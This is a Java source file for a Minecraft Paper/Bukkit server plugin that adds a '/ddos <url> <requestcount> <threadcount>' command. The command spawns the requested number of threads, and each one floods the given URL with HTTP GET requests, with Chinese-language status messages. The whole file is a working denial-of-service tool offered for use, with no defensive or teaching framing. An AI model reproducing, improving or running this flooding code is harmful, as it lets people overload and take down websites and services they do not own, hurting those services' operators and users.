package paper.plugin.ddostool;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import cn.hutool.http.HttpUtil;

public class DDosCommand implements CommandExecutor{
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length < 3) {
            sender.sendMessage("Usage: /ddos <url> <requestcount> <threadcount>");
            return false;
        }
        String url = args[0];
        String nrequests = args[1];
        int nrq = Integer.parseInt(nrequests);
        String nthreads = args[2];
        int ntd = Integer.parseInt(nthreads);
        for (int i = 0; i < ntd; i++) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    for (int j = 0; j < nrq; j++) {
                        try{
                            String statusCode = String.valueOf(HttpUtil.createGet(url).execute().getStatus());
                            sender.sendMessage("请求已发送，状态码: " + statusCode);
                        } catch (Exception e) {
                            sender.sendMessage("请求失败: " + e.getMessage());
                        }
                    }
                }
            }).start();
        }
        return true;
    }
}
